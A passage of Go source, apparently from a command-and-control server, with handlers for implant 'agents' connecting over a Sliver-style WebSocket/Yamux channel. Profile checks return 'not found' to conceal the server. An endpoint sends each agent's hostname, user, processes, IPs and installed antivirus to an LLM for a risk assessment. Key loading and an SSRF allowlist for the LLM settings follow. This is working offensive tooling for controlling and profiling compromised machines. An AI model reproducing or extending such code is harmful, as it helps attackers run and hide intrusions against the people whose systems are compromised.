		"task_id": result.TaskID, "agent_id": result.AgentID, "status": result.Status,
	})

	return map[string]interface{}{"status": "received"}
}

// handleWebSocketYamux 处理 Agent 的 WebSocket + Yamux 连接。
// 在单个 WebSocket 连接上复用多个逻辑流，支持并发操作。
// 协议：客户端先发送 "MUX/1" 前缀消息，然后进入 Yamux 模式。
func (s *Server) handleWebSocketYamux(w http.ResponseWriter, r *http.Request) {
	// S-P0-5: IP 白名单检查（与 /register 等默认端点一致）
	if err := s.gateway.CheckIP(r); err != nil {
		s.audit.Log("GATEWAY_BLOCK", map[string]string{
			"reason": "ip_whitelist_ws_yamux", "ip": r.RemoteAddr,
		})
		http.Error(w, "blocked", http.StatusForbidden)
		return
	}

	// SEC: Profile validation for WebSocket (consistent with HTTP endpoints)
	if s.profileValid != nil {
		s.profileValid.UpdateProfile(s.profileMgr.Active())
		result := s.profileValid.Validate(r)
		if !result.Valid {
			s.audit.Log("WS_YAMUX_PROFILE_MISMATCH", map[string]string{
				"ip":     r.RemoteAddr,
				"reason": result.Reason,
			})
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}

	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[server] yamux websocket upgrade failed: %v", err)
		return
	}
	defer conn.Close()

	// SEC: Set read limit to prevent oversized messages
	conn.SetReadLimit(10 * 1024 * 1024) // 10MB max

	remoteAddr := r.RemoteAddr
	log.Printf("[server] yamux websocket connected: %s", remoteAddr)

	// 读取 MUX/1 前缀（Sliver 协议）
	_, msg, err := conn.ReadMessage()
	if err != nil {
		log.Printf("[server] yamux preface read failed: %v", err)
		return
	}
	if string(msg) != "MUX/1" {
		log.Printf("[server] yamux: bad preface: %q", msg)
		conn.WriteMessage(websocket.TextMessage, []byte(`{"error":"bad preface"}`))
		return
	}

	// 创建 Yamux 会话，使用闭包捕获 handleWSMessage 作为回调
	ys, err := yamux.NewSession(conn, func(env *protocol.Envelope) map[string]interface{} {
		// Nonce 重放检查
		if s.nonceCache.Check(env.AgentID, env.Nonce) {
			return map[string]interface{}{"error": "replay"}
		}
		return s.handleWSMessage(env, remoteAddr)
	})
	if err != nil {
		log.Printf("[server] yamux session create failed: %v", err)
		return
	}

	// 启动 Yamux 流监听
	ys.Serve()
}

// === LLM 智能体 API ===

// handleLLMAnalyze 触发 LLM 对指定 Agent 的环境进行分析。
func (s *Server) handleLLMAnalyze(w http.ResponseWriter, r *http.Request) {
	if s.llmAnalyst == nil {
		http.Error(w, "LLM analyst not configured", http.StatusServiceUnavailable)
		return
	}

	var req struct {
		AgentID   string   `json:"agent_id"`
		Processes []string `json:"processes,omitempty"`
		IPs       []string `json:"ips,omitempty"`
		Antivirus []string `json:"antivirus,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	// 获取 Agent 基本信息
	agent, ok := s.agentMgr.GetAgent(req.AgentID)
	if !ok {
		http.Error(w, "agent not found", http.StatusNotFound)
		return
	}

	fp := &llm.EnvFingerprint{
		AgentID:   agent.ID,
		Hostname:  agent.Hostname,
		OS:        agent.OS,
		Arch:      agent.Arch,
		Username:  agent.Username,
		PID:       agent.PID,
		Processes: req.Processes,
		IPs:       req.IPs,
		Antivirus: req.Antivirus,
	}

	result, err := s.llmAnalyst.Analyze(r.Context(), fp)
	if err != nil {
		s.audit.Log("LLM_ANALYSIS_FAILED", map[string]string{
			"agent_id": req.AgentID, "reason": err.Error(),
		})
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	s.audit.Log("LLM_ANALYSIS", map[string]string{
		"agent_id": req.AgentID, "risk": result.RiskLevel,
	})

	json.NewEncoder(w).Encode(result)
}

// handleLLMResult 获取指定 Agent 的 LLM 分析结果。
func (s *Server) handleLLMResult(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	agentID := vars["agent_id"]

	result, ok := s.llmAnalyst.GetCached(agentID)
	if !ok {
		http.Error(w, "no analysis result for agent", http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(result)
}

// handleLLMConfig 配置 LLM 智能体参数。
func (s *Server) handleLLMConfig(w http.ResponseWriter, r *http.Request) {
	var req struct {
		APIKey     string  `json:"api_key"`
		BaseURL    string  `json:"base_url"`
		Model      string  `json:"model"`
		MaxTokens  int     `json:"max_tokens"`
		Temperature float64 `json:"temperature"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", http.StatusBadRequest)
		// SEC-2: 不返回详细错误（防止 API Key 泄露）
		return
	}

	// SEC-2: 验证 BaseURL 防止 SSRF — 只允许已知 LLM 提供商域名
	if req.BaseURL != "" {
		u, err := parseURL(req.BaseURL)
		if err != nil || !isAllowedLLMHost(u) {
			s.audit.Log("LLM_CONFIG_REJECTED", map[string]string{
				"ip":     r.RemoteAddr,
				"reason": "invalid or disallowed base_url",
			})
			http.Error(w, "invalid base_url: only https LLM endpoints allowed", http.StatusBadRequest)
			return
		}
	}

	cfg := llm.DefaultConfig()
	if req.APIKey != "" {
		cfg.APIKey = req.APIKey
	}
	if req.BaseURL != "" {
		cfg.BaseURL = req.BaseURL
	}
	if req.Model != "" {
		cfg.Model = req.Model
	}
	if req.MaxTokens > 0 {
		cfg.MaxTokens = req.MaxTokens
	}
	if req.Temperature > 0 {
		cfg.Temperature = req.Temperature
	}

	s.llmAnalyst = llm.NewAnalyst(cfg)
	s.llmAnalyst.ClearCache()

	s.audit.Log("LLM_CONFIG", map[string]string{
		"model": cfg.Model,
	})

	// SEC-2: 响应中不包含 API Key 或 BaseURL
	json.NewEncoder(w).Encode(map[string]string{
		"status": "ok", "model": cfg.Model,
	})
}

// parseURL 简单 URL 解析（只取 scheme + host）。
func parseURL(raw string) (*url.URL, error) {
	u, err := url.Parse(raw)
	if err != nil {
		return nil, err
	}
	if u.Scheme != "https" {
		return nil, fmt.Errorf("only https scheme allowed")
	}
	if u.Host == "" {
		return nil, fmt.Errorf("empty host")
	}
	return u, nil
}

// keyDirectory 返回密钥存储目录。
func keyDirectory(_ *config.ServerConfig) string {
	return "keys"
}

// loadOrGenerateRSAKeys 尝试从磁盘加载 RSA 私钥，不存在则生成并持久化。
func loadOrGenerateRSAKeys(cfg *config.ServerConfig) (*servercrypto.RSAKeyPair, error) {
	keyDir := keyDirectory(cfg)
	os.MkdirAll(keyDir, 0700)

	keyPath := filepath.Join(keyDir, "rsa_key.pem")
	if data, err := os.ReadFile(keyPath); err == nil {
		kp, err := servercrypto.LoadRSAKeyFromPEM(data)
		if err == nil {
			log.Printf("[KEYS] loaded RSA key from %s", keyPath)
			return kp, nil
		}
		log.Printf("[KEYS] failed to load RSA key: %v, generating new one", err)
	}

	kp, err := servercrypto.GenerateKeyPair()
	if err != nil {
		return nil, fmt.Errorf("generate RSA key: %w", err)
	}
	if err := os.WriteFile(keyPath, kp.PrivateKeyPEM(), 0600); err != nil {
		log.Printf("[KEYS] failed to persist RSA key: %v", err)
	} else {
		log.Printf("[KEYS] generated and saved RSA key to %s", keyPath)
	}
	return kp, nil
}

// loadOrGenerateECDHKeys 尝试从磁盘加载 ECDH 私钥，不存在则生成并持久化。
func loadOrGenerateECDHKeys(cfg *config.ServerConfig) (*servercrypto.ECDHKeyPair, error) {
	keyDir := keyDirectory(cfg)
	os.MkdirAll(keyDir, 0700)

	keyPath := filepath.Join(keyDir, "ecdh_key.hex")
	if data, err := os.ReadFile(keyPath); err == nil {
		hexStr := strings.TrimSpace(string(data))
		kp, err := servercrypto.LoadECDHKeyPairFromHex(hexStr)
		if err == nil {
			log.Printf("[KEYS] loaded ECDH key from %s", keyPath)
			return kp, nil
		}
		log.Printf("[KEYS] failed to load ECDH key: %v, generating new one", err)
	}

	kp, err := servercrypto.GenerateECDHKeyPair()
	if err != nil {
		return nil, fmt.Errorf("generate ECDH key: %w", err)
	}
	hexPriv := hex.EncodeToString(kp.PrivateKey.Bytes())
	if err := os.WriteFile(keyPath, []byte(hexPriv), 0600); err != nil {
		log.Printf("[KEYS] failed to persist ECDH key: %v", err)
	} else {
		log.Printf("[KEYS] generated and saved ECDH key to %s", keyPath)
	}
	return kp, nil
}

// isAllowedLLMHost 检查 URL 是否为合法的 LLM 提供商域名。
func isAllowedLLMHost(u *url.URL) bool {
	allowedDomains := []string{
		"api.openai.com",
		"api.anthropic.com",
		"api.groq.com",
		"api.together.xyz",
		"api.deepseek.com",
	}
	host := u.Hostname()
	for _, domain := range allowedDomains {
		if host == domain || strings.HasSuffix(host, "."+domain) {
			return true
		}
	}
	if ip := net.ParseIP(host); ip != nil {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsUnspecified() {
			return false
		}
	}
	return false
}
